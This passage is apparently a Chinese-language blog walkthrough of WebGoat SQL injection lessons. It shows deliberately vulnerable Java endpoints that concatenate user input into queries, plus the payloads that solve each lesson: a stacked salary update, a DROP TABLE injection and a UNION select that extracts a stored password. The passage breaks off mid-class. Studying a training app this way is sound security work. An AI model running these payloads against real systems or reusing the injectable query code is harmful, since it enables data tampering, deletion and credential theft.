class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint.9.1&quot;, &quot;SqlStringInjectionHint.9.2&quot;, &quot;SqlStringInjectionHint.9.3&quot;, &quot;SqlStringInjectionHint.9.4&quot;, &quot;SqlStringInjectionHint.9.5&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson9</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson9</span><span class="params">(LessonDataSource dataSource)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjection/attack9&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String name,<span class="meta">@RequestParam</span> String auth_tan)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> injectableQueryIntegrity(name,auth_tan);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">injectableQueryIntegrity</span><span class="params">(String  name,String auth_tan)</span>&#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM employees WHERE last_name = &#x27;&quot;</span>+ name + <span class="string">&quot;&#x27; AND auth_tan = &#x27;&quot;</span> + auth_tan +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection())&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_UPDATABLE);</span><br><span class="line"><span class="comment">//                注意这里是更新语句</span></span><br><span class="line">                SqlInjectionLesson8.log(connection,query);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(query);</span><br><span class="line">                <span class="type">var</span> <span class="variable">test</span> <span class="operator">=</span> resultSet.getRow() != <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (resultSet.getStatement() != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (resultSet.first())&#123;</span><br><span class="line">                        output.append(SqlInjectionLesson8.generateTable(resultSet));</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.8.no.results&quot;</span>).build();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                System.err.println(e.getMessage());</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;&lt;br&gt;&lt;span class=&#x27;feedback-negative&#x27;&gt;&quot;</span> + e.getMessage() + <span class="string">&quot;&lt;/span&gt;&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> checkSalaryRanking(connection,output);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.err.println(e.getMessage());</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;&lt;br&gt;&lt;span class=&#x27;feedback-negative&#x27;&gt;&quot;</span>+e.getMessage()+<span class="string">&quot;&lt;/span&gt;&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> AttackResult <span class="title function_">checkSalaryRanking</span><span class="params">(Connection connection,StringBuffer output)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM employees ORDER BY salary DESC&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_UPDATABLE))&#123;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(query);</span><br><span class="line">                resultSet.first();</span><br><span class="line"><span class="comment">//                这里游标到达第一个</span></span><br><span class="line">                <span class="keyword">if</span> ((resultSet.getString(<span class="number">2</span>).equals(<span class="string">&quot;John&quot;</span>))&amp;&amp; (resultSet.getString(<span class="number">3</span>).equals(<span class="string">&quot;Smith&quot;</span>)))&#123;</span><br><span class="line"><span class="comment">//                    这里就是检测结果first_name是不是 John last_name是不是 Smith</span></span><br><span class="line">                    output.append(SqlInjectionLesson8.generateTable(resultSet));</span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.9.success&quot;</span>).output(output.toString()).build();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.9.one&quot;</span>).output(output.toString()).build();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;&lt;br&gt;&lt;span class=&#x27;feedback-negative&#x27;&gt;&quot;</span>+e.getMessage()+<span class="string">&quot;&lt;/span&gt;&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>简单堆叠注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Smith&#x27;;update employees set salary=&#x27;83000000&#x27; where auth_tan=&#x27;3SL99A&#x27; -- +</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908131946425.png" alt="image-20220908131946425"></p>
<h4 id="SqlInjectionLesson10"><a href="#SqlInjectionLesson10" class="headerlink" title="SqlInjectionLesson10"></a>SqlInjectionLesson10</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint.10.1&quot;, &quot;SqlStringInjectionHint.10.2&quot;, &quot;SqlStringInjectionHint.10.3&quot;, &quot;SqlStringInjectionHint.10.4&quot;, &quot;SqlStringInjectionHint.10.5&quot;, &quot;SqlStringInjectionHint.10.6&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson10</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson10</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjection/attack10&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String action_string)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> injectableQueryAvailability(action_string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">injectableQueryAvailability</span><span class="params">(String action)</span>&#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM access_log WHERE action LIKE &#x27;%&quot;</span>+action +<span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection())&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Statement statement= connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(query);</span><br><span class="line">                <span class="keyword">if</span> (resultSet.getStatement() != <span class="literal">null</span>)&#123;</span><br><span class="line">                    resultSet.first();</span><br><span class="line">                    output.append(SqlInjectionLesson8.generateTable(resultSet));</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.10.entries&quot;</span>).output(output.toString()).build();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (tableExists(connection))&#123;</span><br><span class="line">                        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.10.entries&quot;</span>).output(output.toString()).build();</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.10.success&quot;</span>).build();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                <span class="keyword">if</span> (tableExists(connection))&#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;&lt;span class=&#x27;feedback-negative&#x27;&gt;&quot;</span>+e.getMessage()+<span class="string">&quot;&lt;/span&gt;&lt;br&gt;&quot;</span>+output.toString()).build();</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.10.success&quot;</span>).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="string">&quot;&lt;span class=&#x27;feedback-negative&#x27;&gt;&quot;</span>+e.getMessage()+<span class="string">&quot;&lt;/span&gt;&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">tableExists</span><span class="params">(Connection connection)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(<span class="string">&quot;SELECT * FROM access_log&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">cols</span> <span class="operator">=</span> resultSet.getMetaData().getColumnCount();</span><br><span class="line">            <span class="keyword">return</span> (cols &gt; <span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">eMessage</span> <span class="operator">=</span> e.getMessage();</span><br><span class="line">            <span class="keyword">if</span> (eMessage.contains(<span class="string">&quot;object not found: ACCESS_LOG&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.err.println(e.getMessage());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>删库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#x27;; drop table access_log-- +</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908135904037.png" alt="image-20220908135904037"></p>
<h3 id="advanced"><a href="#advanced" class="headerlink" title="advanced"></a>advanced</h3><h4 id="SqlInjectionAdvanced"><a href="#SqlInjectionAdvanced" class="headerlink" title="SqlInjectionAdvanced"></a>SqlInjectionAdvanced</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.advanced;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionAdvanced</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;2.sql.advanced.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SqlInjectionLesson6a"><a href="#SqlInjectionLesson6a" class="headerlink" title="SqlInjectionLesson6a"></a>SqlInjectionLesson6a</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.advanced;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.lessons.sql_injection.introduction.SqlInjectionLesson5a;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Result;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint-advanced-6a-1&quot;, &quot;SqlStringInjectionHint-advanced-6a-2&quot;, &quot;SqlStringInjectionHint-advanced-6a-3&quot;,</span></span><br><span class="line"><span class="meta">        &quot;SqlStringInjectionHint-advanced-6a-4&quot;, &quot;SqlStringInjectionHint-advanced-6a-5&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson6a</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson6a</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjectionAdvanced/attack6&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String userid_6a)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> injectableQuery(userid_6a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">injectableQuery</span><span class="params">(String accountName)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection())&#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">usedUnion</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            query = <span class="string">&quot;SELECT * FROM user_data WHERE last_name = &#x27;&quot;</span>+accountName +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!accountName.matches(<span class="string">&quot;(?i)(^[^-/*;)]*)(\\s*)UNION(.*$)&quot;</span>))&#123;</span><br><span class="line">                usedUnion = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY))&#123;</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(query);</span><br><span class="line">                <span class="keyword">if</span> ((resultSet != <span class="literal">null</span>) &amp;&amp; (resultSet.first()))&#123;</span><br><span class="line">                    <span class="type">ResultSetMetaData</span> <span class="variable">resultSetMetaData</span> <span class="operator">=</span> resultSet.getMetaData();</span><br><span class="line">                    <span class="type">StringBuffer</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">                    output.append(SqlInjectionLesson5a.wirteTable(resultSet,resultSetMetaData));</span><br><span class="line">                    String appendingWhenSucceded;</span><br><span class="line">                    <span class="keyword">if</span> (usedUnion)</span><br><span class="line"><span class="comment">//                        这里分别表示使用union还是没用</span></span><br><span class="line">                        appendingWhenSucceded = <span class="string">&quot;Well done! Can you also figure out a solution, by appending a new SQL Statement?&quot;</span>;</span><br><span class="line">                    <span class="type">else</span></span><br><span class="line">                        <span class="variable">appendingWhenSucceded</span> <span class="operator">=</span> <span class="string">&quot;Well done! Can you also figure out a solution, by using a UNION?&quot;</span>;</span><br><span class="line">                    resultSet.last();</span><br><span class="line">                    <span class="keyword">if</span> (output.toString().contains(<span class="string">&quot;dave&quot;</span>)&amp;&amp;output.toString().contains(<span class="string">&quot;passW0rD&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//                        这里是通关条件</span></span><br><span class="line">                        output.append(appendingWhenSucceded);</span><br><span class="line">                        <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.advanced.6a.success&quot;</span>).feedbackArgs(output.toString()).output(<span class="string">&quot; Your query was : &quot;</span>+query).build();</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(output.toString()+<span class="string">&quot;&lt;br&gt; Your query was : &quot;</span>+query).build();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.advanced.6a.no.results&quot;</span>).output(<span class="string">&quot; Your query was : &quot;</span> + query).build();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException sqle)&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(sqle.getMessage() + <span class="string">&quot;&lt;br&gt; Your query was : &quot;</span> + query).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(<span class="built_in">this</span>.getClass().getName()+ <span class="string">&quot; : &quot;</span>+e.getMessage() +<span class="string">&quot;&lt;br&gt; Your query was : &quot;</span>+query).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SqlInjectionLesson6b"><a href="#SqlInjectionLesson6b" class="headerlink" title="SqlInjectionLesson6b"></a>SqlInjectionLesson6b</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.advanced;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson6b</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionLesson6b</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjectionAdvanced/attack6b&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String userid_6b)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="keyword">if</span> (userid_6b.equals(getPassword()))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;dave&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT password FROM user_system_data WHERE user_name = &#x27;dave&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(query);</span><br><span class="line">                <span class="keyword">if</span> (resultSet != <span class="literal">null</span> &amp;&amp; resultSet.first())&#123;</span><br><span class="line">                    password = resultSet.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException sqle)&#123;</span><br><span class="line">                sqle.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> (password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,user_name,password,7 from user_system_data  where user_name =&#x27;dave&#x27;  -- + </span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908153915708.png" alt="image-20220908153915708"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;select * from user_system_data -- +</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908155707552.png" alt="image-20220908155707552"></p>
<p>两个框是两个题目</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908220745492.png" alt="image-20220908220745492"></p>
<h4 id="SqlInjectionChallenge"><a href="#SqlInjectionChallenge" class="headerlink" title="SqlInjectionChallenge"></a>SqlInjectionChallenge</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.advanced;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PutMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlInjectionChallenge1&quot;, &quot;SqlInjectionChallenge2&quot;, &quot;SqlInjectionChallenge3&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionChallenge</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionChallenge</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 